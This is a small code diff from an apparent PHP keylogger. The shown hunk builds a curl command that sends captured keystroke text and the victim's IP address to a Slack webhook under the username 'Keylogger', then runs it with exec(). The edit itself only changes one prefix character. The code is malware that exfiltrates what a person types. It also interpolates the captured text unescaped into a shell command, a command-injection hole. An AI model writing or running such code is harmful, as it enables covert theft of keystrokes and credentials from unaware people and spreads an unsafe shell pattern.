@@ -27,7 +27,7 @@ $i = $i + 1;
 }
 
 // Post to Slack Channel
-$cmd4 = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$Slack_Channel.'", "username": "Keylogger ('.$IP.')", "text": "< '.$text.'", "icon_emoji": ":keyboard:"}\' '.$Slack_Webhook_URL;
+$cmd4 = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$Slack_Channel.'", "username": "Keylogger ('.$IP.')", "text": "> '.$text.'", "icon_emoji": ":keyboard:"}\' '.$Slack_Webhook_URL;
 exec($cmd4);
 
 }
